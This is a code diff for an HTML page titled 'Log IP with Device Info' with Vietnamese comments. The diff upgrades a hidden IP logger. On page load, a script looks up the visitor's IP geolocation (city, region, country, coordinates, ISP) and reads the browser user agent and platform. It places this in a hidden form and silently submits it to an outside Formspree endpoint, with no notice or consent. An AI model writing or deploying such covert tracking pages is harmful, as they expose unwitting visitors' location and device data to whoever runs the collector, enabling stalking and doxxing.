@@ -2,19 +2,56 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <title>Log IP with Device Info</title>
 </head>
 <body>
   <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
-    <input type="hidden" name="ip" id="ipInput">
+    <input type="hidden" name="ip_info" id="ipInfo">
   </form>
 
   <script>
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ipInput').value = data.ip;
+    async function getClientInfo() {
+      try {
+        // Lấy IP và thông tin địa lý
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geoData = await geoRes.json();
+
+        const ip = geoData.ip;
+        const city = geoData.city;
+        const region = geoData.region;
+        const country = geoData.country_name;
+        const lat = geoData.latitude;
+        const lon = geoData.longitude;
+        const isp = geoData.org;
+
+        // Lấy thông tin thiết bị
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+
+        // Chuẩn bị nội dung gửi
+        const details = `
+IP: ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Latitude: ${lat}
+Longitude: ${lon}
+ISP: ${isp}
+
+User-Agent: ${ua}
+Platform: ${platform}
+        `.trim();
+
+        document.getElementById('ipInfo').value = details;
+
+        // Gửi form
         document.getElementById('ipForm').submit();
-      });
+      } catch (err) {
+        console.error('Failed to fetch info', err);
+      }
+    }
+
+    getClientInfo();
   </script>
 </body>
 </html>
